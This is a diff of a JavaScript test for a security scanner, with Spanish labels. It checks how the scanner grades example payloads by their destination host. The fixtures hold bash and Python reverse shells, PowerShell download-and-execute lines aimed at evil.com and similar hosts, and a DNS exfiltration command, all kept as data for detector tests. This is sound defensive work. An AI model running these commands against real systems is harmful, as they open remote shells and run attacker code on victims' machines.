@@ -293,17 +293,22 @@ test('scripts remotos: lo que solo se muestra no cuenta', () => {
   assert.equal(onlyShown('curl https://x | sh'), false);
 });
 
-test('revisión: payloads de ejemplo con destino de marcador bajan; con host real, no', async (t) => {
+test('revisión: payloads de ejemplo con destino de marcador bajan; con host que puede ser de alguien, no', async (t) => {
   const dir = fx.write(fx.tmpDir('review-dest'), {
     'docs/a.md': 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n',
-    'docs/b.md': "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')\n",
-    'docs/c.md': 'dig $(whoami).burpcollaborator.net\n',
-    'docs/d.md': "IEX(New-Object Net.WebClient).DownloadString('https://cdn.corp-portal.com/s.ps1')\n",
-    'docs/e.md': 'dig $(whoami).k3j9x2.oast.fun\n',
+    'docs/b.md': "IEX(New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')\n",
+    'docs/c.md': 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n',
+    // dominios registrados: pueden cambiar de dueño
+    'docs/d.md': "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')\n",
+    'docs/e.md': 'dig $(whoami).your-id.interact.sh\n',
     'docs/f.md': 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n',
+    // señuelos: el destino real va en una variable o en otra línea
+    'docs/g.md': 'IEX(New-Object Net.WebClient).DownloadString($u) # http://evil.example/x\n',
+    'docs/h.py': 'H = "c2-cdn.net"\n# s.connect(("ATTACKER", 1))\ns=socket.socket();s.connect((H,4444))\nos.dup2(s.fileno(),0)\n',
   });
   t.after(() => fx.rm(dir));
   const r = await analyzeTree(dir, {});
-  for (const f of ['docs/a.md', 'docs/b.md', 'docs/c.md']) assert.equal(r.threats.find((x) => x.file === f).severity, 'low', f);
-  for (const f of ['docs/d.md', 'docs/e.md', 'docs/f.md']) assert.ok(['critical', 'high'].includes(r.threats.find((x) => x.file === f).severity), `${f}: el destino puede ser real`);
+  const of = (f) => r.threats.find((x) => x.file === f && ['revshell', 'ps-iex', 'exfil-webhook'].includes(x.rule));
+  for (const f of ['docs/a.md', 'docs/b.md', 'docs/c.md']) assert.equal(of(f).severity, 'low', f);
+  for (const f of ['docs/d.md', 'docs/e.md', 'docs/f.md', 'docs/g.md', 'docs/h.py']) assert.ok(['critical', 'high'].includes(of(f).severity), `${f}: el destino puede ser de alguien`);
 });
